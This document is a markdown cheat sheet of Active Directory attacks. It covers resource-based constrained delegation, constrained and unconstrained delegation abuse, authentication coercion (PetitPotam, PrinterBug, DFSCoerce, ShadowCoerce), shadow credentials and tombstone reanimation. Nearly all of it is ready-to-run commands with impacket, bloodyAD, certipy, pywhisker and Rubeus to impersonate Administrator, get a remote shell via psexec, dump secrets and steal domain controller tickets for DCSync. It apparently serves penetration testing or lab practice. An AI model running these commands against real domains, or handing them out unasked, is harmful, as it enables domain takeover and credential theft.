# Delegation & RBCD Attacks

## Enumeration
```bash
# Find all delegation rights in the domain
impacket-findDelegation '<dom>/<user>:<pass>' -dc-ip <DC>
# Check machine account quota (needed for RBCD if no controlled SPN account)
nxc ldap <DC> -u <user> -p '<pass>' -M maq
```

## RBCD (Resource-Based Constrained Delegation)
**Requires:** WriteProperty on `msDS-AllowedToActOnBehalfOfOtherIdentity` of
target computer + a controlled SPN account (or MachineAccountQuota > 0).

```bash
# Step 1: Add computer if needed (MachineAccountQuota > 0)
impacket-addcomputer '<dom>/<user>:<pass>' -computer-name 'EVIL$' -computer-pass 'P@ss123' -dc-ip <DC>

# Step 2: Set delegation (allow EVIL$ to act on behalf of users to TARGET$)
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write \
  '<dom>/<user>:<pass>' -dc-ip <DC>

# Step 3: Get service ticket impersonating Administrator
impacket-getST -spn 'cifs/<target>.<dom>' -impersonate Administrator \
  -dc-ip <DC> '<dom>/EVIL$:P@ss123'

# Step 4: Use the ticket
export KRB5CCNAME=Administrator@cifs_target.dom.ccache
impacket-psexec -k -no-pass <target>.<dom>
impacket-secretsdump -k -no-pass <target>.<dom>
```

### SPN-less RBCD (U2U, MachineAccountQuota=0)
When you can't create a machine account but have an existing controlled account:
```bash
export KRB5CCNAME=user.ccache
impacket-getST -u2u -impersonate Administrator -spn "host/<target>" \
  -k -no-pass '<dom>/<user>'
```

### RBCD via bloodyAD
```bash
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' add rbcd '<TARGET>$' 'EVIL$'
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' remove rbcd '<TARGET>$' 'EVIL$'
```

## Constrained Delegation (S4U2self + S4U2proxy)
When a service account has `AllowedToDelegateTo` set:
```bash
# Get ST for the allowed SPN, impersonating admin
impacket-getST -spn '<allowed-SPN>' -impersonate Administrator \
  -dc-ip <DC> '<dom>/<svc-acct>:<pass>'

# Alternative service (e.g., allowed to time/ but want cifs/)
impacket-getST -spn 'time/<target>' -impersonate Administrator \
  -dc-ip <DC> '<dom>/<svc>:<pass>' -altservice cifs/<target>
```

## Unconstrained Delegation
When a computer has `TrustedForDelegation` set, any user's TGT that
authenticates to it is cached. Coerce a DC to authenticate -> steal its TGT.
```bash
# On the compromised unconstrained delegation host:
Rubeus.exe monitor /interval:5
# From attacker: coerce DC authentication
python3 petitpotam.py <UNCONSTRAINED-HOST> <DC>
# OR: python3 printerbug.py '<dom>/<user>:<pass>'@<DC> <UNCONSTRAINED-HOST>
# Captured TGT -> DCSync
```

## Coercion Attacks (force a target to authenticate to your listener)
All feed into NTLM relay (to LDAP for RBCD/Shadow Creds, or to ADCS HTTP
enrollment for ESC8). Combine with unconstrained delegation above.
```bash
# PetitPotam (MS-EFSRPC) — most reliable, works unauthenticated on unpatched
python3 petitpotam.py <LISTENER> <TARGET>
python3 petitpotam.py -d <dom> -u <user> -p '<pass>' <LISTENER> <TARGET>

# PrinterBug / SpoolSample (MS-RPRN) — requires Print Spooler running
python3 printerbug.py '<dom>/<user>:<pass>'@<TARGET> <LISTENER>

# DFSCoerce (MS-DFSNM) — requires DFS role
python3 dfscoerce.py -d <dom> -u <user> -p '<pass>' <LISTENER> <TARGET>

# ShadowCoerce (MS-FSRVP) — requires File Server VSS Agent
python3 shadowcoerce.py -d <dom> -u <user> -p '<pass>' <LISTENER> <TARGET>
```

## Shadow Credentials (Key Trust)
**Requires:** WriteProperty on `msDS-KeyCredentialLink` of target.
Windows Server 2016+ domain functional level.

```bash
# pywhisker: add shadow credential
pywhisker -d <dom> -u <user> -p '<pass>' --target <victim> --action add --filename shadow1
# Then PKINIT to get TGT:
certipy auth -pfx shadow1.pfx -dc-ip <DC>
# OR:
python3 gettgtpkinit.py '<dom>/<victim>' victim.ccache -cert-pfx shadow1.pfx -pfx-pass <pass>

# certipy all-in-one
certipy shadow auto -account <victim> -u '<user>@<dom>' -p '<pass>' -dc-ip <DC>

# bloodyAD
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' add shadowCredentials <victim>

# Cleanup
pywhisker -d <dom> -u <user> -p '<pass>' --target <victim> --action remove --device-id <GUID>
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' remove shadowCredentials <victim> --key <key>
```

## Tombstone Reanimation
**Requires:** Reanimate Tombstones extended right + CreateChild on the target OU.
```bash
# By username
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' set restore <deleted-user>
# By SID
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' set restore 'S-1-5-21-...-1110'
# By full tombstone DN
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' set restore \
  'CN=mark.davies\0ADEL:<guid>,CN=Deleted Objects,DC=dom,DC=local'
```
Restored objects regain their SID but lose group memberships. Password may be
blank or default -- try `set password` immediately after restore.
Restored objects vanish again on VM reset; re-run the restore after reboots.
